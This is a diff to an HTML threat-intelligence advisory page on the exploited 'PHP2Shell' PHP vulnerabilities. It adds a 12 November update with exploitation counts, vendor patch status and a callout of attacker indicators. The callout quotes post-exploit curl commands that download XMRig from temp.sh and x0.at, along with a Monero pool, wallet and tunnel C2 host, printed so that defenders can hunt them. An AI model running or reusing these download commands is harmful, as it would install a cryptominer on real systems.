@@ -467,7 +467,7 @@ section > p { margin-bottom: 14px; }
     <div class="meta-row">
       <span class="chip chip-crit">Critical · exploited</span>
       <span class="chip chip-mute">TLP:CLEAR</span>
-      <span>Compiled 21 Oct 03:55 · revised 5 Nov &middot; PAN-OS hotfixes complete, CSA AL-2026-157, CVE-2026-115560 still unpatched, Censys: 29m of 46m servers still flawed</span>
+      <span>Compiled 21 Oct 03:55 · revised 12 Nov &middot; PAN-OS hotfixes complete, CSA AL-2026-157, CVE-2026-115560 still unpatched, Censys: 29m of 46m servers still flawed</span>
       <span>Patched 13:44 UTC · in CISA KEV, remediation due 29 Oct</span>
     </div>
     <h1>PHP2Shell: <span class="nw">CVE-2026-109618</span> &amp; <span class="nw">CVE-2026-109619</span></h1>
@@ -504,7 +504,7 @@ section > p { margin-bottom: 14px; }
     </div>
     <div class="toc-col">
       <p class="toc-h">What happened</p>
-      <a href="#update-11-nov">Update, 11&nbsp;Nov</a><a href="#update-09-nov-pm">Update, 9&nbsp;Nov (afternoon)</a><a href="#update-09-nov">Update, 9&nbsp;Nov</a><a href="#update-05-nov">Update, 5&nbsp;Nov</a><a href="#update-04-nov">Update, 4&nbsp;Nov</a><a href="#update-29">Update, 29&nbsp;Oct</a><a href="#update-28">Update, 28&nbsp;Oct</a>
+      <a href="#update-12-nov">Update, 12&nbsp;Nov</a><a href="#update-11-nov">Update, 11&nbsp;Nov</a><a href="#update-09-nov-pm">Update, 9&nbsp;Nov (afternoon)</a><a href="#update-09-nov">Update, 9&nbsp;Nov</a><a href="#update-05-nov">Update, 5&nbsp;Nov</a><a href="#update-04-nov">Update, 4&nbsp;Nov</a><a href="#update-29">Update, 29&nbsp;Oct</a><a href="#update-28">Update, 28&nbsp;Oct</a>
       <a href="#situation">Confirmed &mdash; and withdrawn</a>
       <a href="#attribution">Attribution</a>
       <a href="#exploitation-status">Exploitation status</a>
@@ -603,6 +603,43 @@ section > p { margin-bottom: 14px; }
       </table>
     </div>
   <p class="to-contents"><a href="#toc">↑ Back to contents</a></p></section>
+
+<section id="update-12-nov">
+<p class="eyebrow">Update &middot; 12 November</p>
+<h2>Exploitation is still running: GreyNoise counts 1,226 successes, and a fresh cluster mines Monero</h2>
+<p class="lede">The trackers moved again. GreyNoise now counts <strong>1,226 successful exploitations</strong> (was 1,215 on 9 November), and the new successes are not a tail of the October wave: a fresh cluster began on <strong>10 November at about 14:50 UTC</strong> and was still running on <strong>12 November at 05:54&ndash;05:55 UTC</strong>, with post-exploit commands downloading XMRig and mining Monero. NCSC-NL&rsquo;s list is unchanged since its 9 November 09:49 CET update (968 products tracked, 205 fixed, 215 vulnerable), php.net&rsquo;s latest item is still 5 November (PHP 8.6.0 RC5), and CVE-2026-115560 is still unpatched. Trend Micro&rsquo;s advisory is still headed &ldquo;Current Status as of Nov. 4&rdquo;: the 11 November critical-patch ETA for Apex One (on-premise) and Apex Central has passed with both still listed &ldquo;Impacted&rdquo; and no new ETA given; Deep Discovery Analyzer&rsquo;s ETA is today, 12 November.</p>
+<div class="callout">
+<span class="label">New operator indicators &mdash; GreyNoise, 10&ndash;12 November</span>
+<p>Three attacker IPs new to this wave: <code>154.3.235.207</code> (Cogent, AS174, first seen 12 November 05:53 UTC), <code>45.115.192.75</code> (Hype Enterprises, AS13332, 11 November 19:44 UTC) and <code>31.57.193.98</code> (11 November 06:34 UTC), alongside continuing activity from <code>45.89.209.106</code>, <code>107.172.204.206</code>, <code>31.56.127.35</code> and <code>31.57.192.177</code>. Post-exploit shells download XMRig &mdash; <code>curl -sS -X POST -o xmrig https://temp.sh/ZjBhy/xmrig</code> and <code>curl -fsSL -C - -o xmrig https://x0.at/tSky</code> &mdash; then run it against Monero pool <code>pool.supportxmr.com:3333</code> (wallet <code>49Gej6TbPqyRhZvJQKpthyaBhd6DsUPq4BmtBKMxXHfb8Xv57iVSPg3PJ6iaokogkzKKuFFryE9qgRTKwJv8addzEcyhP7b</code>); a later variant runs <code>xmrigMiner</code> / <code>xmrigDaemon</code> with a Cloudflare-tunnel command-and-control URL at <code>barnes-table-everybody-feels.trycloudflare.com:443</code>. The 12 November 05:54 UTC session shows the miner already running (<code>sh -&gt; xmrigMiner</code>). Hunt the download URLs, the pool and the wallet, not just the source IPs &mdash; the IPs rotate, the mining infrastructure does not.</p>
+</div>
+<h3>Tracker figures, before and after</h3>
+<div class="board">
+<div class="tile"><div class="k">Products tracked</div><div class="v">968</div><div class="n">NCSC-NL; unchanged since 9 Nov 09:49 CET</div></div>
+<div class="tile"><div class="k">Fixed</div><div class="v">205</div><div class="n">NCSC-NL; unchanged since 9 Nov 09:49 CET</div></div>
+<div class="tile"><div class="k">Vulnerable</div><div class="v">215</div><div class="n">NCSC-NL; unchanged since 4 Nov</div></div>
+<div class="tile"><div class="k">GreyNoise successes</div><div class="v">1,226</div><div class="n">Successful exploitations, as of 12 Nov 09:00 UTC; was 1,215 (9 Nov)</div></div>
+</div>
+<div class="scroll">
+<table>
+<thead><tr><th>Tracker</th><th>Before</th><th>Now</th></tr></thead>
+<tbody>
+<tr><td>NCSC-NL products tracked</td><td>968 (9 Nov 09:49 CET)</td><td><strong>968</strong> &mdash; unchanged</td></tr>
+<tr><td>NCSC-NL fixed</td><td>205</td><td><strong>205</strong> &mdash; unchanged</td></tr>
+<tr><td>NCSC-NL vulnerable</td><td>215</td><td>215 &mdash; unchanged</td></tr>
+<tr><td>GreyNoise successful exploitations</td><td>1,215 from 5 IPs (9 Nov)</td><td><strong>1,226</strong> (12 Nov 09:00 UTC) &mdash; fresh cluster from 10 Nov 14:50 UTC, still running 12 Nov 05:55 UTC</td></tr>
+<tr><td>GreyNoise total sessions / attacker IPs</td><td>255,240 / 682 (9 Nov)</td><td><strong>No newer figure</strong> &mdash; the live page does not publish a sessions total</td></tr>
+</tbody>
+</table>
+</div>
+<h3>What this changes, and what it does not</h3>
+<ul>
+<li><strong>Exploitation is current, not a late-October peak.</strong> The 11 November section recorded GreyNoise at 1,215 with &ldquo;no newer figure&rdquo;; the count has now moved to 1,226 on activity that began 10 November and ran through the morning of 12 November. The post-exploit payload in this wave is commodity cryptomining (XMRig/Monero), not a new capability &mdash; but it confirms shells are still being won on unpatched PHP today.</li>
+<li><strong>Trend Micro&rsquo;s 11 November patch ETA passed unmet.</strong> KA-0024802 still reads &ldquo;Current Status as of Nov. 4&rdquo;; Apex One (on-premise) and Apex Central remain &ldquo;Impacted &mdash; Critical Patch ETA: Nov. 11&rdquo; with no replacement date, and Deep Discovery Analyzer&rsquo;s ETA is today, 12 November, still &ldquo;Impacted&rdquo;. An ETA is not a shipped fix &mdash; the next check should confirm whether Apex One/Central and DDAN have landed. TMMS ETA remains 17 November.</li>
+<li><strong>It does not change the victim picture.</strong> No new named PHP victim, no new attribution and no new vendor patch status were found in this check. Xerox XRX26-016 is still v6 (6 November); Fiery FS800&ndash;FS500 patches still have no public confirmation of shipment. Fortinet FG-IR-26-186 and Cisco&rsquo;s advisory are unchanged (v1.11, 6 November, Final).</li>
+<li><code>CVE-2026-115560</code> remains unpatched at the 12 November check; PHP has not released 8.5.13 or 8.4.28; mitigation remains <code>session.upload_progress.enabled=0</code>. It is not in CISA KEV.</li>
+</ul>
+<p>Sources: <a href="https://php.events.greynoise.io/" target="_blank" rel="noopener noreferrer">GreyNoise &mdash; PHP2Shell Activity 2026, live dashboard read 12 Nov 2026 09:00 UTC (1,226 successful exploitations; fresh cluster 10 Nov 14:50 UTC to 12 Nov 05:55 UTC; new IPs 154.3.235.207, 45.115.192.75, 31.57.193.98; XMRig download and Monero mining)</a> &middot; <a href="https://success.trendmicro.com/en-US/solution/KA-0024802" target="_blank" rel="noopener noreferrer">Trend Micro &mdash; KA-0024802, status as of 4 Nov (Apex One/Central Critical Patch ETA 11 Nov passed unmet, still Impacted; DDAN ETA 12 Nov; TMMS ETA 17 Nov)</a> &middot; <a href="https://github.com/NCSC-NL/php2shell" target="_blank" rel="noopener noreferrer">NCSC-NL &mdash; php2shell (TLP:CLEAR), software list last status update 9 Nov 09:49 CET, unchanged</a></p>
+<p class="to-contents"><a href="#toc">↑ Back to contents</a></p></section>
 
 <section id="update-11-nov">
 <p class="eyebrow">Update &middot; 11 November</p>
